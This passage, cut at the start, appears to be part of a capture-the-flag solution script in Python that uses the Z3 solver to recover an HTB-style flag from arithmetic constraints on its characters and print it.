    s.add(flag[16] - 9 == flag[13] + 4)
    s.add(flag[12] == 17 * 3)
    s.add(flag[4] - flag[5] + flag[12] == flag[14] + 20)
    s.add(flag[12] * flag[15] == 24 * flag[14])
    s.add(flag[18] + flag[4] == 173)
    s.add(flag[6] == flag[5] + 63)
    s.add(flag[16] * 32 == flag[0] * flag[7])
    s.add(flag[21] == 125)
    s.add(flag[3] - flag[2] == 57)
    s.add(flag[17] - flag[15] == flag[18] + 1)
    
    for i in range(len(flag)):
        s.add(flag[i] >= 48)
        s.add(flag[i] <= 125)

    s.add(flag[0] == ord('H'))
    s.add(flag[1] == ord('T'))
    s.add(flag[2] == ord('B'))
    s.add(flag[3] == ord('{'))
    s.add(flag[21] == ord('}'))

    if s.check() == sat:
        m = s.model()
        for v in flag:
           print(chr(m[v].as_long()), end="", flush=True)

if __name__ == "__main__":
    main()
```
